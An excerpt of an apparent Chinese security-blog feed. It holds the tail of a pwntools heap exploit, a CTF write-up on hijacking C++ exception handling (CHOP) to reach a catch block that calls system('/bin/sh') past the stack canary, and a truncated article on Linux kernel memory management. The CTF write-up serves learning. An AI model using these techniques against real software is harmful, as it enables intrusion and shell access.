class="number">10</span>,<span class="number">0x40</span>,cipher.encrypt(p64(gadget))) </span><br><span class="line"><span class="comment">#free_hook写入了gadget，下次free会将栈迁移到free的chunk+0xa0写的内容</span></span><br><span class="line"><span class="comment"># 到这都成功了</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;题目分析&lt;/h1&gt;
&lt;p&gt;Glibc2.27，64位保护全开，沙箱ban掉了execve和execveat，打orw。&lt;/p&gt;
&lt;h2 id=&quot;爆破用户名和密码&quot;&gt;爆破用户名和密码&lt;/h2&gt;
&lt;p&gt;这个程序上来先在远程打开了用户名和密码的文件要我们输入，找了半天没找到题目</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="heap" scheme="http://example.com/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>CHOP——强网杯2024expect_number wp</title>
    <link href="http://example.com/2024/11/10/CHOP%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024expect-number-wp/"/>
    <id>http://example.com/2024/11/10/CHOP%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024expect-number-wp/</id>
    <published>2024-11-10T15:27:20.000Z</published>
    <updated>2024-11-20T12:42:03.374Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>参考自<a href="https://xz.aliyun.com/t/12967">溢出漏洞在异常处理中的攻击利用手法-上</a>和<a href="https://xz.aliyun.com/t/12994">溢出漏洞在异常处理中的攻击利用手法-下</a></p></blockquote><h1>简单了解下C++异常处理</h1><p>C++有这样的关键字，支持执行异常的处理：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="built_in">do_sth</span>();</span><br><span class="line">    <span class="keyword">throw</span> exception;</span><br><span class="line">    <span class="built_in">nothing_will_happen_here</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">catch</span>(exception typeA)&#123;</span><br><span class="line">    <span class="built_in">my_handler</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">catch</span>(exception typeB)&#123;</span><br><span class="line">    <span class="built_in">my_handler2</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于C++的异常处理：</p><blockquote><p><a href="https://www.cnblogs.com/sgawscd/p/13870406.html">https://www.cnblogs.com/sgawscd/p/13870406.html</a><br><a href="https://blog.csdn.net/GrayOnDream/article/details/138469330">https://blog.csdn.net/GrayOnDream/article/details/138469330</a>  &lt;-- 具体的细节参考这一篇即可</p></blockquote><p>简单的来说，任何函数都可以通过throw关键字抛出异常。对于可能抛出异常的代码，要用try去包裹。而后续需要用catch去捕获异常。<br>catch可以在后面添加类型来声明catch内处理的异常类型。触发throw后，在开发者的视角下，会从抛出异常的try块向外匹配第一个类型合适的catch块，然后程序会将控制权移交到catch块中的异常处理代码。此时throw后面的代码全部都不会执行，因此这种控制流的强行跳转给了我们利用的机会。这种对于catch逐层向上的匹配机制，叫做<strong>栈展开(Stack Unwind)</strong>。</p><h2 id="libstdc-的异常处理实现">libstdc++的异常处理实现</h2><p>下面以linux的libstdc++的实现为例大概看一下throw之后发生了什么</p><p>首先，当使用throw关键字的时候，编译器会先用<code>__cxa_allocate_exception</code>分配一些处理所需要的对象空间。然后程序会调用<code>__cxa_throw()</code>抛出异常，最后核心函数会进入<code>_Unwind_RaiseException()</code>。再后面就是gdb跟进困难的内容了，具体细节不再赘述。不过会用Unwind以及程序中<code>eh_frame</code>节中相关的信息去对堆栈进行回溯。</p><p>既然会回溯找代码，那么一定会设计到堆栈中pc的恢复，也就是返回地址。如果我们能够覆盖try块的返回地址然后去throw，就可能能劫持到控制流到其他的catch块（不是其他catch块的话，回溯到main发现没有catch代码，会被terminate退出）</p><p>另外，由于throw后面的内容其实都根本不会执行，所以这个操作能够绕过canary（check根本不执行，覆盖了canary也没事），这是比较神奇的一点。</p><h1>对于这道题目</h1><h2 id="流程分析">流程分析</h2><p>这一部分我们不多讲，程序是通过一个以1为种子的伪随机数序列，然后通过用户输入0 1 2进行加，乘，除操作。程序提供了一个<br>system gift（但是没用）。</p><p>指针初始化在initarray，程序有4个类，一个基类和3个派生（猜测这是为了让它们函数虚表的地址相邻），其中两个派生类一个是退出一个是存在溢出的漏洞函数。5010-&gt;5520-&gt;vtable-&gt;func</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">data.rel.ro:<span class="number">0000000000004</span>C20 ; `vtable <span class="keyword">for</span><span class="number">&#x27;</span>Derived3</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C20 _ZTV8Derived3   dq <span class="number">0</span>                    ; offset to this</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C28                 dq offset _ZTI8Derived3 ; `typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Derived3</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C30 off_4C30        dq offset display_d3    ; DATA XREF: set_d3_display+<span class="number">1</span>C↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C38 ; `vtable <span class="keyword">for</span><span class="number">&#x27;</span>Derived2</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C38 _ZTV8Derived2   dq <span class="number">0</span>                    ; offset to this</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C40                 dq offset _ZTI8Derived2 ; `typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Derived2</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C48 quit_ptr        dq offset quit          ; DATA XREF: set_quit+<span class="number">1</span>C↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C50 ; `vtable <span class="keyword">for</span><span class="number">&#x27;</span>Derived</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C50 _ZTV7Derived    dq <span class="number">0</span>                    ; offset to this</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C58                 dq offset _ZTI7Derived  ; `typeinfo <span class="keyword">for</span><span class="number">&#x27;</span>Derived</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C60 vuln_off        dq offset vuln          ; DATA XREF: init_game+<span class="number">1</span>C↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C68 ; `vtable <span class="keyword">for</span><span class="number">&#x27;B</span>ase</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C68 _ZTV4Base       dq <span class="number">0</span>                    ; offset to this</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C70                 dq offset _ZTI4Base     ; `typeinfo <span class="keyword">for</span><span class="number">&#x27;B</span>ase</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C78 base_display_ptr dq offset base_display ; DATA XREF: set_base_display_ptr+C↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000004</span>C80                 public _ZTISt13runtime_error ; weak</span><br></pre></td></tr></table></figure><p>5520正好在输入结构的+288位置，重复288次输入没有考虑结构体头的12字节，可以溢出12字节。但是每次写入之后前一个就会被覆盖为上次操作我们实际上只能溢出1个字节。恰巧的是，1个就够了，50-&gt;60即可总之我们就利用程序的逻辑和一个offbyone的漏洞将正常退出的指针劫持到了虚表里另一个派生类的漏洞函数上。</p><p>我们重点关注这个有栈溢出的后门：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="built_in">std</span>::runtime_error *exception; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE buf[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;();</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v0, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL) &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    exception = (<span class="built_in">std</span>::runtime_error *)__cxa_allocate_exception(<span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="built_in">std</span>::runtime_error::runtime_error(exception, <span class="string">&quot;Input too long&quot;</span>);</span><br><span class="line">    __cxa_throw(exception,</span><br><span class="line">    (<span class="keyword">struct</span> type_info *)&amp;`typeinfo forstd`::runtime_error,</span><br><span class="line">    (<span class="type">void</span> (*)(<span class="type">void</span> *))&amp;<span class="built_in">std</span>::runtime_error::~runtime_error);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时程序里还有这样的catch块：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000024E1</span> ; __unwind &#123; <span class="comment">// __gxx_personality_v0</span></span><br><span class="line">.text:<span class="number">00000000000024E1</span>                 endbr64</span><br><span class="line">.text:<span class="number">00000000000024E5</span>                 push    rbp</span><br><span class="line">.text:<span class="number">00000000000024E6</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">00000000000024E9</span>                 push    rbx</span><br><span class="line">.text:<span class="number">00000000000024</span>EA                 sub     rsp, <span class="number">28</span>h</span><br><span class="line">.text:<span class="number">00000000000024</span>EE                 mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">00000000000024F</span>7                 mov     [rbp+var_18], rax</span><br><span class="line">.text:<span class="number">00000000000024F</span>B                 xor     eax, eax</span><br><span class="line">.text:<span class="number">00000000000024F</span>D                 mov     [rbp+var_24], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000002504</span>                 lea     rax, [rbp+var_24]</span><br><span class="line">.text:<span class="number">0000000000002508</span>                 mov     rsi, rax</span><br><span class="line">.text:<span class="number">000000000000250B</span>                 lea     rax, _ZSt3cin   ; <span class="built_in">std</span>::<span class="built_in">cin</span></span><br><span class="line">.text:<span class="number">0000000000002512</span>                 mov     rdi, rax</span><br><span class="line">.text:<span class="number">0000000000002515</span> ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000002515</span>                 call    __ZNSirsERi     ; <span class="built_in">std</span>::istream::operator&gt;&gt;(<span class="type">int</span> &amp;)</span><br><span class="line">.text:<span class="number">0000000000002515</span> ;   &#125; <span class="comment">// starts at 2515</span></span><br><span class="line">.text:<span class="number">000000000000251</span>A                 mov     eax, [rbp+var_24]</span><br><span class="line">.text:<span class="number">000000000000251</span>D                 jmp     <span class="type">short</span> loc_256A</span><br><span class="line">.text:<span class="number">000000000000251F</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000000251F</span> ;   catch(<span class="built_in">std</span>::runtime_error) <span class="comment">// owned by 2515</span></span><br><span class="line">.text:<span class="number">000000000000251F</span>                 endbr64</span><br><span class="line">.text:<span class="number">0000000000002523</span>                 cmp     rdx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000002527</span>                 jz      <span class="type">short</span> loc_2531</span><br><span class="line">.text:<span class="number">0000000000002529</span>                 mov     rdi, rax        ; <span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Exception</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">000000000000252</span>C                 call    __Unwind_Resume</span><br><span class="line">.text:<span class="number">0000000000002531</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000002531</span></span><br><span class="line">.text:<span class="number">0000000000002531</span> loc_2531:                               ; CODE XREF: <span class="built_in">cin</span>+<span class="number">46</span>↑j</span><br><span class="line">.text:<span class="number">0000000000002531</span>                 mov     rdi, rax        ; <span class="type">void</span> *</span><br><span class="line">.text:<span class="number">0000000000002534</span>                 call    ___cxa_begin_catch</span><br><span class="line">.text:<span class="number">0000000000002539</span>                 mov     [rbp+var_20], rax</span><br><span class="line">.text:<span class="number">000000000000253</span>D                 lea     rax, command    ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">0000000000002544</span>                 mov     rdi, rax        ; command</span><br><span class="line">.text:<span class="number">0000000000002547</span> ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000002547</span>                 call    _system  ; ------&gt; system</span><br><span class="line">.text:<span class="number">0000000000002547</span> ;   &#125; <span class="comment">// starts at 2547</span></span><br><span class="line">.text:<span class="number">000000000000254</span>C                 call    ___cxa_end_catch</span><br><span class="line">.text:<span class="number">0000000000002551</span>                 jmp     <span class="type">short</span> loc_256A</span><br><span class="line">.text:<span class="number">0000000000002553</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000002553</span> ;   cleanup() <span class="comment">// owned by 2547</span></span><br><span class="line">.text:<span class="number">0000000000002553</span>                 endbr64</span><br><span class="line">.text:<span class="number">0000000000002557</span>                 mov     rbx, rax</span><br><span class="line">.text:<span class="number">000000000000255</span>A                 call    ___cxa_end_catch</span><br><span class="line">.text:<span class="number">000000000000255F</span>                 mov     rax, rbx</span><br><span class="line">.text:<span class="number">0000000000002562</span>                 mov     rdi, rax        ; <span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Exception</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">0000000000002565</span>                 call    __Unwind_Resume</span><br><span class="line">.text:<span class="number">000000000000256</span>A ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000000256</span>A</span><br><span class="line">.text:<span class="number">000000000000256</span>A loc_256A:                               ; CODE XREF: <span class="built_in">cin</span>+<span class="number">3</span>C↑j</span><br><span class="line">.text:<span class="number">000000000000256</span>A                                         ; <span class="built_in">cin</span>+<span class="number">70</span>↑j</span><br><span class="line">.text:<span class="number">000000000000256</span>A                 mov     rdx, [rbp+var_18]</span><br><span class="line">.text:<span class="number">000000000000256</span>E                 sub     rdx, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">0000000000002577</span>                 jz      <span class="type">short</span> loc_257E</span><br><span class="line">.text:<span class="number">0000000000002579</span>                 call    ___stack_chk_fail</span><br><span class="line">.text:<span class="number">000000000000257</span>E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000000257</span>E</span><br><span class="line">.text:<span class="number">000000000000257</span>E loc_257E:                               ; CODE XREF: <span class="built_in">cin</span>+<span class="number">96</span>↑j</span><br><span class="line">.text:<span class="number">000000000000257</span>E                 mov     rbx, [rbp+var_8]</span><br><span class="line">.text:<span class="number">0000000000002582</span>                 leave</span><br><span class="line">.text:<span class="number">0000000000002583</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000002583</span> ; &#125; <span class="comment">// starts at 24E1</span></span><br><span class="line">.text:<span class="number">0000000000002583</span> <span class="built_in">cin</span>             endp</span><br></pre></td></tr></table></figure><p>想办法让程序返回到这就可以了。本着实践大于理论的原则比赛的时候试了好久（其实也就一小时可能）都没成，结果是要返回到0x251a，我就低了5个字节。</p><p>事实上是，将返回地址填成我们想要跳转到的catch块，rbp的值只要是一个可读写的地址就行了，防止中间汇编rbp寻址的时候sigsegv。</p><h1>几个小问题</h1><h2 id="程序怎么识别的try-catch块？">程序怎么识别的try-catch块？</h2><p>编译器为程序生成了一个异常处理表<code>.gcc_except_table</code>，作为一个单独的节存放相关的信息。</p><h2 id="rbp的作用？">rbp的作用？</h2><p>如果在handler中有<code>leave;ret</code>的gadget，我们理论上在溢出后控制rbp就能劫持控制流。其他情况下一般要注意rbp地址有效。</p><h2 id="注意：">注意：</h2><p>这个ret地址的范围并不精确，尽量要写到带有catch的函数的try范围内，如果不成功一定要换附近地址多试几次，血泪教训。</p><h1>什么是CHOP?</h1><p>CHOP是Catch Handler Oriented Programming。出自一篇论文，更多的可以去看开篇提到的blog。总之这玩意的思想就是：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cxa_call_unexpected (<span class="type">void</span> *exc_obj_in) &#123;</span><br><span class="line"> xh_terminate_handler = xh-&gt;terminateHandler;</span><br><span class="line"> <span class="keyword">try</span> &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line"> <span class="built_in">catch</span> (...) &#123;</span><br><span class="line"> __terminate(xh_terminate_handler);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __terminate (<span class="built_in">void</span> (*handler)()) <span class="keyword">throw</span> () &#123;</span><br><span class="line"> <span class="comment">/* ... */</span></span><br><span class="line"> <span class="built_in">handler</span>();</span><br><span class="line"> std::<span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有函数指针的地方就有pwn，libstdc++中有这样一个调用指针的地方。如果异常处理前存在栈溢出能劫持返回地址，我们控制好xh_terminate_handler这一局部变量后返回到<code>__cxa_call_unexpected</code>的catch块就能实现控制流劫持。通过这个Golden Gadget，我们可以将有canary的栈溢出变成无canary的栈溢出，只需要以这个catch做跳板。</p><p>版本更高的libc也只是调用路径更复杂了。</p><p>摸了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;参考自&lt;a href=&quot;https://xz.aliyun.com/t/12967&quot;&gt;溢出漏洞在异常处理中的攻击利用手法-上&lt;/a&gt;和&lt;a href=&quot;https://xz.aliyun.com/t/12994&quot;&gt;溢出漏洞在异常处理中的攻击利用手法</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="chop" scheme="http://example.com/tags/chop/"/>
    
  </entry>
  
  <entry>
    <title>页表之上——Linux内核的内存管理</title>
    <link href="http://example.com/2024/10/30/%E9%A1%B5%E8%A1%A8%E4%B9%8B%E4%B8%8A%E2%80%94%E2%80%94Linux%E5%86%85%E6%A0%B8%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <id>http://example.com/2024/10/30/%E9%A1%B5%E8%A1%A8%E4%B9%8B%E4%B8%8A%E2%80%94%E2%80%94Linux%E5%86%85%E6%A0%B8%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</id>
    <published>2024-10-30T11:08:20.000Z</published>
    <updated>2024-11-18T06:43:09.933Z</updated>
    
    <content type="html"><![CDATA[<p>我们都知道，进程内部寻址用的是虚拟地址，虚拟地址要经过mmu被映射到物理地址，进程的页表是独立的等等。但是那么多页表，内核又是怎么调度页表的呢？在我们向内核申请下一个4kb的时候究竟发生了什么？</p><blockquote><p>参考自：<a href="https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I">https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I</a><br>以及一篇更加入门的介绍：<a href="https://cloud.tencent.com/developer/article/1775509">https://cloud.tencent.com/developer/article/1775509</a><br><a href="https://segmentfault.com/a/1190000043626203">https://segmentfault.com/a/1190000043626203</a></p></blockquote><h1>内核视角下的“主存”</h1><p>在内核的视图下，内存自顶向下有3级的管理，依次是节点（node），区（zone）和页（page）或者页框（page frame）。我们从最高（最大）的等级依次向下看。</p><h2 id="什么是节点？">什么是节点？</h2><blockquote><p><a href="https://blog.csdn.net/gatieme/article/details/52384075">https://blog.csdn.net/gatieme/article/details/52384075</a><br>写的很细很好，不再摘抄了，了解节点可以直接点进去看按我看这两篇blog的理解，节点大概就是<strong>物理内存条</strong>， 虽然肯定不是这个意思，但是在抽象的层级上来说，地位大概是物理内存条这一级。这个东西涉及到硬件处理器的设计。一般来讲，对于现代多核CPU访问内存有两种架构，UMA（均匀存储器存取，Uniform-Memory-Access）和NUMA（非均匀存储器存取）。</p></blockquote><p>先说UMA,这种思想就是对于多个CPU, 他们对所有主存都有同样的访问级别，从总线存取的时间等等都基本一样，外围设备也能够共享。大火都一样。</p><p>节点的概念则来自于NUMA架构。简单来讲，虽然每个CPU都能访问全部的物理内存，但是它们访问“自己的”本地存储会更快。我们把这样的本地存储叫做“簇（bank）”，把这些不同的cpu叫做“节点（node）”。而在操作系统内存分配的时候，我们说的节点也就指这些内存簇了。</p><p>LINUX需要的是一种体系无关的内存分配结构，所以它采用了NUMA的节点概念。对于UMA,我们就认为只有一个节点，将他转化成一种伪NUMA的体系进行处理就好了。所以以UMA架构为例的话，节点就是全部的物理存储单元。</p><p>linux使用<code>pg_data_t</code>来描述一个节点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The pg_data_t structure is used in machines with CONFIG_DISCONTIGMEM</span></span><br><span class="line"><span class="comment"> * (mostly NUMA machines?) to denote a higher-level memory zone than the</span></span><br><span class="line"><span class="comment"> * zone denotes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * On NUMA machines, each NUMA node would have a pg_data_t to describe</span></span><br><span class="line"><span class="comment"> * it&#x27;s memory layout.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Memory statistics and page replacement data structures are maintained on a</span></span><br><span class="line"><span class="comment"> * per-zone basis.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bootmem_data</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> &#123;</span></span><br><span class="line">    <span class="comment">/*  包含了结点中各内存域的数据结构 , 可能的区域类型用zone_type表示*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zone</span> <span class="title">node_zones</span>[<span class="title">MAX_NR_ZONES</span>];</span></span><br><span class="line">    <span class="comment">/*  指点了备用结点及其内存域的列表，以便在当前结点没有可用空间时，在备用结点分配内存   */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> <span class="title">node_zonelists</span>[<span class="title">MAX_ZONELISTS</span>];</span></span><br><span class="line">    <span class="type">int</span> nr_zones;                                   <span class="comment">/*  保存结点中不同内存域的数目    */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FLAT_NODE_MEM_MAP <span class="comment">/* means !SPARSEMEM */</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">node_mem_map</span>;</span>      <span class="comment">/*  指向page实例数组的指针，用于描述结点的所有物理内存页，它包含了结点中所有内存域的页。    */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page_ext</span> *<span class="title">node_page_ext</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_NO_BOOTMEM</span></span><br><span class="line">       <span class="comment">/*  在系统启动boot期间，内存管理子系统初始化之前，</span></span><br><span class="line"><span class="comment">       内核页需要使用内存（另外，还需要保留部分内存用于初始化内存管理子系统）</span></span><br><span class="line"><span class="comment">       为解决这个问题，内核使用了自举内存分配器 </span></span><br><span class="line"><span class="comment">       此结构用于这个阶段的内存管理  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bootmem_data</span> *<span class="title">bdata</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Must be held any time you expect node_start_pfn, node_present_pages</span></span><br><span class="line"><span class="comment">     * or node_spanned_pages stay constant.  Holding this will also</span></span><br><span class="line"><span class="comment">     * guarantee that any pfn_valid() stays that way.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * pgdat_resize_lock() and pgdat_resize_unlock() are provided to</span></span><br><span class="line"><span class="comment">     * 